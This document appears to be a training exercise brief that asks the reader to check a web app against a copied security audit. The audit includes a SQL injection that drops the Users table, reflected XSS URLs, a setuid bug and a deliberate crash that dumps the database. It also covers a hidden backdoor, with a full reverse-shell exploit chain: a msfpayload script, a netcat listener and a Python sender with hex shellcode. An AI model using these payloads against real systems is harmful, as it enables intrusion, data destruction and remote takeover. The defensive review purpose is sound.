# Software Security Audit

## Objective
Someone online has done a software security audit of the source we based out web app on.  In short, they found some major issues.  The report was pulled from a Wordpress blog to out company wiki and is shown below.  Go over the vulnerabilities in the audit and write a detailed report about whether or not your web app is vulnerable to the issues mentioned.  Include details about any mitigations that were taken to prevent the issues mentioned in the audit.  If our web app is vulnerable include details for how could mitigate the attack and a work estimate (guestimate of hours, days, or weeks) of how long it would take to fix the issue(s).

## Web App Vulnerabilities and Exploits

### SQL Injection on Forms
Drop Users table by entering statement below in the "username" field of the login form.  SQL injection appears likely on other forms as well.

`test'; DROP TABLE Users;#`

Note other SQL injections are possible aside from the example above.

### Reflected XSS

The timesheet page takes unsanitized input from the query parameter and embeds it in a hidden html input element, which could result in reflected XSS attacks.

    http://localhost/webapp/timesheet?query=01-02-2014"><script>alert(42);</script>
    
    http://localhost/webapp/timesheet?query=01-02-2014%22%3E%3Cscript%3Ealert%2842%29;%3C/script%3E

### Plaintext Database Password Entries
The MySQL database contains plaintext passwords and other sensitive information.

### Database Dump
Using the libunwind library is used to recover from crashes and dumps the contents of the database on a crash.  Additionally the log_status "feature" (or malware?) causes a crash on average 1/1000 page requests.

    if ((rand() % 1000) == 0) {
        log_stats(stderr, DISPATCH, LOG_LEVEL_DEFAULT);
    }

### Privilige Escalation
The following lines are an accidental or sneaky attempt to make the application run as root.  The if condition actually sets the uid instead of checking it.  A valid check would utilize "==" not "=".
        
	int uid = (int) geteuid();
	if(uid = 0){
		// never run webapp as root, its a security risk
		uid = 1;
	}
	// set uid to non-root user
	setuid(uid);
	seteuid(uid);

### Known Session Identifiers
Cookies utilize poor session management.  Authorization could be bypassed by setting the Cookie "Authorized" field to "yes".  Additionally session names are just the names of user accounts and can be easily guessed by attackers, which could result in privilege escalation attacks.

### Hidden Backdoor
If a POST request is made with the user agent "asn_roodkcab" ("nsa_backdoor" spelled backwards) the string value of the "data" parameter is decoded as ASCII hex to binary and run in executable memory.  This was tested using metasploit to generate a reverse shell payload and sent with a python script to activate remotely.  Sample scripts below.  A demo video of the attack is available [Here](TODO).

Generate your shellcode payload.  Sample script to generate payload with metasploit on Kali shown below.  Depending on target machine OS and architecture some changes may need to be made.  This was tested on a target machine running Ubuntu 12.04 LTS 64 bit.

	#!/bin/bash
	clear
	echo -e "Enter attacker machine IP:  \c"
	read IP
	echo -e "Enter port: \c"
	read port
	msfpayload linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$port R | msfencode -b "\x00\x0a\x0b\x0c\x0d" -t c -e x64/xor >> payload
	echo "Finished"
	ls -la payload

On attacking machine setup the reverse shell listener with netcat (set port to the port you want to listen on, example here is port 447):

`run nc -nvvlp 447`

Edit script with the proper IP address or URL of the victim machine and the Hex encode payload you generated in the previous step (note you will need to do some Find/Replace to get it formatted correctly).  Then on the attacking machine run:

	#!/usr/bin/python
	import urllib
	import urllib2
	
	# replace with target machine IP or URL
	url = 'http://192.168.1.154/webapp'
	
	# replace with your target specific shell code
	# note shellcode should be HEX encode without seperating charcters
	values = {'data' : '4831C94881E9F6FFFFFF488D05EFFFFFFF48BBF0C671726F32CBE248315827482DF8FFFFFFE2F49AEF29EB05309488F1987E7727A5835BF2C670CDAF9ACAD5A18EF89405229188DA9E7E77053195AA0F081B53373DCE9706AC4A2AF67A70CD92AF1F5D1C5ACBB1B84F9620387A4204FFC371726F32CBE2'}
	
	headers = { 'User-Agent' : 'asn_roodkcab' }
	
	data = urllib.urlencode(values)
	req = urllib2.Request(url, data, headers)
	response = urllib2.urlopen(req)
	page = response.read()
	
	print page
